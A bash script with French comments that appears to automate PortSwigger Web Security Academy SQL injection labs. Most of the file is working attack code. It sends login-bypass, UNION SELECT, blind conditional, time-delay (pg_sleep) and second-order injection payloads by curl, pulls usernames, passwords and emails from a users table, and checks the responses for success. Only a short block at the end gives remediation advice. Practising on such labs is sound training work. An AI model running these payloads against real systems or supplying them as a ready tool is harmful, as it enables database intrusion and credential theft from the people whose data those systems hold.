#!/bin/bash

# --------- Utilisation ---------
# ./script.sh https://<lab>.web-security-academy.net
# --------------------------------

if [ -z "$1" ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"
COOKIE="session=<your-session-cookie>" # À adapter si besoin

print_sep() {
    echo "------------------------------------------------------"
}

# Challenge 1: SQL injection vulnerability in WHERE clause allowing login bypass
challenge_login_bypass() {
    print_sep
    echo "[Challenge 1] SQL injection vulnerability allowing login bypass"
    # Classique : injection dans le champ username ou password
    resp=$(curl -sk -X POST "$LAB_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "username=' OR 1=1--&password=irrelevant")
    if echo "$resp" | grep -iq "Congratulations\|flag\|Welcome"; then
        echo "[+] Flag ou succès détecté ! (login bypass)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 2: SQL injection UNION attack, retrieving hidden data
challenge_union_hidden_data() {
    print_sep
    echo "[Challenge 2] SQL injection UNION attack, retrieving hidden data"
    # Injection dans un paramètre GET (ex: /filter?category=)
    resp=$(curl -sk "$LAB_URL/filter?category=Gifts'+UNION+SELECT+NULL,username||':'||password+FROM+users--")
    if echo "$resp" | grep -iq "administrator\|flag"; then
        echo "[+] Flag ou données sensibles détectées ! (UNION SELECT)"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 3: SQL injection retrieving data from other tables
challenge_union_other_tables() {
    print_sep
    echo "[Challenge 3] SQL injection retrieving data from other tables"
    # Injection UNION sur un autre paramètre (ex: /filter?category=)
    resp=$(curl -sk "$LAB_URL/filter?category=Accessories'+UNION+SELECT+NULL,email+FROM+users--")
    if echo "$resp" | grep -iq "@\|flag"; then
        echo "[+] Email(s) ou flag détecté(s) !"
    else
        echo "[-] Pas de flag détecté."
    fi
}

# Challenge 4: Blind SQL injection with conditional responses
challenge_blind_conditional() {
    print_sep
    echo "[Challenge 4] Blind SQL injection with conditional responses"
    # Injection sur /product?productId= (détecte la réponse selon la condition)
    resp_true=$(curl -sk "$LAB_URL/product?productId=1'+AND+1=1--")
    resp_false=$(curl -sk "$LAB_URL/product?productId=1'+AND+1=2--")
    if [ "${#resp_true}" -ne "${#resp_false}" ]; then
        echo "[+] Différence de réponse détectée (blind SQLi possible)"
    else
        echo "[-] Pas de différence détectée."
    fi
}

# Challenge 5: Blind SQL injection with time delays
challenge_blind_time() {
    print_sep
    echo "[Challenge 5] Blind SQL injection with time delays"
    # Injection sur /product?productId= avec SLEEP
    t1=$(date +%s)
    curl -sk "$LAB_URL/product?productId=1'+AND+pg_sleep(5)--" > /dev/null
    t2=$(date +%s)
    delta=$((t2-t1))
    if [ "$delta" -ge 5 ]; then
        echo "[+] Délai détecté (blind SQLi temporelle possible)"
    else
        echo "[-] Pas de délai détecté."
    fi
}

# Challenge 6: Second-order SQL injection
challenge_second_order() {
    print_sep
    echo "[Challenge 6] Second-order SQL injection"
    # Injection stockée dans un champ, puis exploitée ailleurs (ex: username)
    curl -sk -X POST "$LAB_URL/register" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Cookie: $COOKIE" \
        --data "username=attacker'+UNION+SELECT+password+FROM+users--&email=evil@evil.com&password=123456" > /dev/null
    # Puis connexion ou affichage du profil pour déclencher l'injection
    resp=$(curl -sk "$LAB_URL/my-account" -H "Cookie: $COOKIE")
    if echo "$resp" | grep -iq "administrator\|flag"; then
        echo "[+] Flag ou données détectées via second-order SQLi !"
    else
        echo "[-] Pas de flag détecté."
    fi
}

print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Utilisez des requêtes paramétrées (prepared statements) partout."
    echo "- Évitez toute concaténation de données utilisateur dans les requêtes SQL."
    echo "- Filtrez et validez strictement toutes les entrées utilisateur."
    echo "- Pour les labs PortSwigger, adaptez les endpoints et payloads selon le scénario."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/sql-injection"
}

print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "Challenges testés :"
    echo "1. SQL injection vulnerability allowing login bypass"
    echo "2. SQL injection UNION attack, retrieving hidden data"
    echo "3. SQL injection retrieving data from other tables"
    echo "4. Blind SQL injection with conditional responses"
    echo "5. Blind SQL injection with time delays"
    echo "6. Second-order SQL injection"
    echo "Contrôle automatique du flag ou message de succès."
    print_sep
}

echo "=== Script PortSwigger SQL Injection (noms des challenges) ==="
challenge_login_bypass
challenge_union_hidden_data
challenge_union_other_tables
challenge_blind_conditional
challenge_blind_time
challenge_second_order
print_remediation
print_summary

# End of script
